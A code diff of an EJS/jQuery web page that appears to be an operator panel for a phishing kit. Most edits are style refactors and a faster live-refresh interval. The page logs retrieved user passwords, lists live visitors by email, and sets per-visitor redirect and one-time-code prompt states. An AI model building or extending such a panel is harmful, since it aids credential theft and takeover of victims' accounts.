@@ -87,7 +87,7 @@ td {
 
         event.preventDefault()
         
-        let em = {
+        var em = {
             email : $("#exampleDataList").val()
         }
             
@@ -111,7 +111,7 @@ console.log(em.email)
         // }, 5000);
         if (response.Success){
             console.log(response.yourdata.password)
-            let date = new Date(response.yourdata.createdAt)
+            var date = new Date(response.yourdata.createdAt)
             document.getElementById('time').value = date.toUTCString()
             document.getElementById('uid').value = response.yourdata.unique_id
             document.getElementById('mongoid').value = response.yourdata._id
@@ -203,20 +203,20 @@ console.log(em.email)
 
 
 
-    <div class="row" style="padding: 44px;">
-        <div class="col-md-6 mb-3 mb-sm-0 liveview" id="liveviewholder"   >
-          <div class="card" >
+    <div class="row" style="padding: 22px;">
+        <div class="col-md-6 mb-3 mb-sm-0 liveview"  style="display: none;"  >
+          <div class="card"  >
            
             <div class="card-body tableo" id="tableo" style=" min-height: 400px;">
               <h5> Live Visitors</h5>
 
-              
+             
               <% if(datax.length){
       
                 for(var i = 0; i< datax.length; i++) {%>  
                
                   <br />
-                  <div style="border: 1px solid #FF851B;" id="liveview"  > 
+                  <div style="border: 1px solid #FF851B;"   > 
                
                     <span > <%= datax[i].email %> </span>
                     <br />
@@ -560,31 +560,24 @@ Time
 </div>
 
 <script >
-  
-
-
-// setTimeout(() => {
-//   document.getElementById('liveviewholder').style.opacity = '0'
-// }, 1000);
-  
 
 
 
 
- 
-
-
-var light;
-
-function disco(){
- 
-
-console.log('getting live data')
 
 
 
 
-const searchel = document.querySelector('.datalistOpt');
+
+
+
+
+
+
+
+
+
+var searchel = document.querySelector('.datalistOpt');
       searchel.addEventListener('change', (event) => {
 
 
@@ -594,14 +587,14 @@ const searchel = document.querySelector('.datalistOpt');
 
 
 
-const selectElement = document.querySelector('.mongoredirectstatuscon');
+var selectElement = document.querySelector('.mongoredirectstatuscon');
       selectElement.addEventListener('change', (event) => {
-        //  const result = document.querySelector('.tutorial');
+        //  var result = document.querySelector('.tutorial');
         //  result.textContent = `You like ${}`;
-          let mongoemail = document.getElementById('mongoemail').value
-          let mongoredirectstatus = event.target.value
+          var mongoemail = document.getElementById('mongoemail').value
+          var mongoredirectstatus = event.target.value
           console.log('you selected ' + mongoredirectstatus + ' with id of ' + mongoemail )
-      let data = {
+      var data = {
         mongoemail: mongoemail,
         redirectstatus: mongoredirectstatus
       }
@@ -650,14 +643,14 @@ const selectElement = document.querySelector('.mongoredirectstatuscon');
 
 
 
-      const selectElementre = document.querySelector('.mongootpcon');
+      var selectElementre = document.querySelector('.mongootpcon');
       selectElementre.addEventListener('change', (event) => {
-        //  const result = document.querySelector('.tutorial');
+        //  var result = document.querySelector('.tutorial');
         //  result.textContent = `You like ${}`;
-          let mongoemail = document.getElementById('mongoemail').value
-          let otpstatus = event.target.value
+          var mongoemail = document.getElementById('mongoemail').value
+          var otpstatus = event.target.value
           console.log('you selected ' + otpstatus + ' with id of ' + mongoemail )
-      let data = {
+      var data = {
         mongoemail: mongoemail,
         otpstatus: otpstatus
       }
@@ -698,40 +691,35 @@ const selectElement = document.querySelector('.mongoredirectstatuscon');
 
 
 
-   
+
+  
 
 
-// setInterval(function(){
-
-//     $.ajax({
-//     type: "POST",
-//     // headers: { "Content-type": "application/json; charset=UTF-8" },
-//     url: "/deletelivedata",
-//    dataType: "json",
-//    success: (response) => {
-    
-
-//     }
-
-
-//    }, 7000)
-
-// })
+//----------------------------------------------------------------------------------------------
+  
 
 
 
 
-$("#reloading-div").load("#reloading-div")
+ 
 
 
+var light;
 
-document.getElementById('golive').innerHTML = "you are live!"
+function disco(){
+ 
+
+console.log('getting live data')
+
+
+$("#tableo").load(window.location.href + " #tableo" );
+// $("#tableo").reload()
+
+// document.getElementById('golive').innerHTML = "you are live!"
 
 }
 
-// function setdisplay(){
-//   document.getElementById('liveview').style.display = 'block'
-// }
+// --------------------------------------------------------------------------------
 
       $("#golive").click(function (){
 
@@ -741,7 +729,7 @@ document.getElementById('golive').innerHTML = "you are live!"
           if (!light) {
          
             // if display is visible
-        light = window.setInterval(disco,5000);
+        light = window.setInterval(disco,3000);
         document.getElementById('golive').innerHTML = "Go offline"
          
        
